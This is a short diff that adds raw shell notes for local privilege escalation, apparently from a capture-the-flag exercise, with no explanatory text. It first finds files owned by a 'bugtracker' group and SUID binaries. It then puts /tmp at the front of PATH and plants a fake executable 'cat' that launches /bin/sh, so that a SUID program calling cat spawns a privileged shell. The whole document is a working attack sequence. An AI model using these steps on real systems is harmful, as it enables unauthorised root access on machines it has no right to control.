@@ -1,0 +1,9 @@
+find / -type f -group bugtracker 2> /dev/null
+find / -type f -perm -u=s 2>/dev/null
+
+
+
+export PATH=/tmp:$PATH
+cd /tmp/
+echo ‘/bin/sh’ > cat
+chmod +x cat
